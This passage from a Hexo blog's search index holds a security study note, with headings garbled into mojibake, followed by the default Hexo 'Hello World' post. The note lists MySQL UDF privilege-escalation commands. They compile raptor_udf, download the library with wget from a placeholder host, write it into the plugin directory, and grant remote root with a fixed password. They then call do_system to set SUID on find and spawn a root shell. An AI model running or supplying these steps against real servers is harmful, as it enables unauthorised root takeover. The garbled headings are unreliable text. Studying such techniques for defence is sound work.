raptor_udf.c<br>gcc -g -shared -o raptor_udf.so raptor_udf.o -lc<br>mv raptor_udf.so <span class="hljs-number">1518.</span>so<br><br><br><br>ä¸Šä¼ æˆ–ä¸‹è½½<span class="hljs-number">1518</span>åˆ°ç›®æ ‡æœåŠ¡å™¨<br>wget https://xx.xx.xx.xx/<span class="hljs-number">1518.</span>so<br><br>è¿›å…¥æ•°æ®åº“è¿›è¡ŒUDFå¯¼å‡º<br>use mysql;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> foo(<span class="hljs-type">line</span> blob);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> foo <span class="hljs-keyword">values</span>(load_file(<span class="hljs-string">&#x27;/tmp/1518.so&#x27;</span>));<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;<span class="hljs-number">0</span><br><br><br>å¼€å¯rootå¤–è”å‘½ä»¤ï¼š<br>    <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;R@v3nSecurity&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>;flush <span class="hljs-keyword">privileges</span>;<br><br><br>åˆ›å»ºdo_systemå‡½æ•°è°ƒç”¨<br>    <span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> do_system <span class="hljs-keyword">returns</span> <span class="hljs-type">integer</span> soname <span class="hljs-string">&#x27;1518.so&#x27;</span>;<br>    <span class="hljs-keyword">select</span> do_system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);<br><br>#é…åˆä½¿ç”¨findè°ƒç”¨æ‰§è¡Œ<br>    touch yeyeye<br>    find yeyeye â€“exec &quot;whoami&quot; \;<br>    find yeyeye â€“exec &quot;/bin/sh&quot; \;<br>    id<br><br> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/07/07/hello-world/"/>
    <url>/2020/07/07/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
